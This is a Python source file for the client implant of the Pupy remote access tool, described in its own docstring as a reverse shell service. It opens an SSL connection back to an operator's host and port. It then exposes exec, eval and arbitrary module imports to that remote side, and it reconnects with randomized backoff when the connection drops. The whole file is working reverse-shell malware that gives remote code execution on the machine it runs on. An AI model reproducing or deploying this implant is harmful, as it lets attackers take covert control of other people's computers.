#!/usr/bin/env python
# -*- coding: UTF8 -*-
import site
import sys
import time
import rpyc
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute, is_py3k
import threading
import weakref
import traceback
import os
import subprocess
import threading
import multiprocessing
import logging
import StringIO
import json
import urllib2
import urllib
import platform
import re
import ssl
import random
import imp


class ReverseSlaveService(Service):
	""" Pupy reverse shell rpyc service """
	__slots__=["exposed_namespace"]
	def on_connect(self):
		self.exposed_namespace = {}
		self._conn._config.update(dict(
			allow_all_attrs = True,
			allow_public_attrs = True,
			allow_pickle = True,
			allow_getattr = True,
			allow_setattr = True,
			allow_delattr = True,
			import_custom_exceptions = False,
			propagate_SystemExit_locally=True,
			propagate_KeyboardInterrupt_locally=True,
			instantiate_custom_exceptions = True,
			instantiate_oldstyle_exceptions = True,
		))
		# shortcuts
		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))

	def on_disconnect(self):
		print "disconnecting !"
		raise KeyboardInterrupt

	def exposed_exit(self):
		raise SystemExit

	def exposed_execute(self, text):
		"""execute arbitrary code (using ``exec``)"""
		execute(text, self.exposed_namespace)
	def exposed_eval(self, text):
		"""evaluate arbitrary code (using ``eval``)"""
		return eval(text, self.exposed_namespace)
	def exposed_getmodule(self, name):
		"""imports an arbitrary module"""
		return __import__(name, None, None, "*")
	def exposed_getconn(self):
		"""returns the local connection instance to the other side"""
		return self._conn

def get_next_wait(attempt):
	if attempt<60:
		return 0.5
	else:
		return random.randint(15,30)

def add_pseudo_pupy_module(HOST):
	""" add a pseudo pupy module for *nix payloads """
	if not "pupy" in sys.modules:
		mod = imp.new_module("pupy")
		mod.__name__="pupy"
		mod.__file__="<memimport>\\\\pupy"
		mod.__package__="pupy"
		sys.modules["pupy"]=mod
		mod.get_connect_back_host=(lambda : HOST)
		mod.pseudo=True

def main():
	HOST="127.0.0.1:443"
	if "windows" in platform.system().lower():
		try:
			import pupy
			HOST=pupy.get_connect_back_host()
		except ImportError:
			print "Warning : ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL"
	else:
		if len(sys.argv)!=2:
			sys.exit("usage: %s host:port"%sys.argv[0])
		HOST=sys.argv[1]
		add_pseudo_pupy_module(HOST)
	attempt=0
	while True:
		try:
			rhost,rport=None,None
			tab=HOST.rsplit(":",1)
			rhost=tab[0]
			if len(tab)==2:
				rport=int(tab[1])
			else:
				rport=443
			print "connecting to %s:%s"%(rhost,rport)
			conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)
			while True:
				attempt=0
				conn.serve()
		except KeyboardInterrupt:
			print "keyboard interrupt raised, restarting the connection"
		except SystemExit:
			print "SystemExit raised"
			break
		except Exception as e:
			time.sleep(get_next_wait(attempt))
			attempt+=1

if __name__=="__main__":
	main()

